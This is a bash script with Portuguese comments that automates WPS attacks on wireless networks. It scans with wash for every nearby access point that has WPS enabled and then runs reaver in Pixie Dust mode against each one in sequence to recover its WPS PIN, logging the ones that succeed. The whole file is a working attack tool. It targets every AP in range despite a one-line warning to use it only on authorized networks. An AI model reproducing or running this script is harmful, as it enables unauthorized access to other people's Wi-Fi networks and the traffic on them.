#!/bin/bash
# run_reaver_all.sh
# Uso: sudo ./run_reaver_all.sh <interface> [scan_seconds]
# Ex: sudo ./run_reaver_all.sh wlan0mon 30
# IMPORTANTE: RODE APENAS EM REDES AUTORIZADAS

set -euo pipefail

IFACE="${1:-}"
SCAN_SECS="${2:-30}"
OUT="wash_out.txt"
DONE_LOG="reaver_done.txt"
REAVER_OPTS="-K -vv"

if [[ -z "$IFACE" ]]; then
  echo "Uso: sudo ./run_reaver_all.sh <interface> [scan_seconds]"
  exit 1
fi

# verificações de pré-requisitos
command -v wash >/dev/null 2>&1 || { echo "wash não encontrado. Instale (wash/aircrack-ng suite)."; exit 1; }
command -v reaver >/dev/null 2>&1 || { echo "reaver não encontrado. Instale reaver."; exit 1; }

# garantir arquivos
: > "$OUT"
touch "$DONE_LOG"

echo "[*] Scanning WPS APs on $IFACE for $SCAN_SECS seconds (press Ctrl+C to abort)"
# roda wash em background e após o tempo mata com INT para flush de saída
sudo wash -i "$IFACE" -s -O "$OUT" >/dev/null 2>&1 & 
WASH_PID=$!
sleep "$SCAN_SECS"
if kill -0 "$WASH_PID" 2>/dev/null; then
  kill -INT "$WASH_PID" 2>/dev/null || kill "$WASH_PID" 2>/dev/null
fi
wait "$WASH_PID" 2>/dev/null || true

# extrai BSSIDs únicos
mapfile -t BSSIDS < <(grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$OUT" | tr '[:lower:]' '[:upper:]' | sort -u)

if [ ${#BSSIDS[@]} -eq 0 ]; then
  echo "Nenhum AP com WPS encontrado em $OUT."
  exit 0
fi

echo "[*] Encontrados ${#BSSIDS[@]} BSSID(s). Iniciando reaver sequencialmente."

for B in "${BSSIDS[@]}"; do
  # nome de arquivo seguro
  SAFE_B=$(echo "$B" | tr ':' '-')
  LOGFILE="reaver_${SAFE_B}.log"

  # pular se já finalizado com sucesso (marca em DONE_LOG)
  if grep -Fxq "$B" "$DONE_LOG"; then
    echo "[=] $B já processado anteriormente. Pulando."
    continue
  fi

  echo -e "\n=== Reaver contra $B ==="
  echo "[+] Log: $LOGFILE"

  # roda reaver (executa com sudo se necessário) e grava saída
  sudo reaver -i "$IFACE" -b "$B" $REAVER_OPTS | tee "$LOGFILE"

  # checa sucesso simples: procura por 'WPS PIN' ou 'pke::' ou 'WPS PIN' (ajuste conforme versão)
  if grep -Ei "WPS PIN|pke::|WPS pin" "$LOGFILE" >/dev/null 2>&1; then
    echo "$B" >> "$DONE_LOG"
    echo "[+] $B marcado como concluído (possível PIN encontrado)."
  else
    echo "[-] $B finalizado sem indicação de PIN na saída. Verifique $LOGFILE."
  fi

  # pequeno delay entre tentativas para estabilizar hardware
  sleep 2
done

echo -e "\n[*] Processo completo. Logs: $(ls -1 reaver_*.log 2>/dev/null || echo 'nenhum')"
echo "[*] BSSIDs finalizados (arquivo $DONE_LOG)."
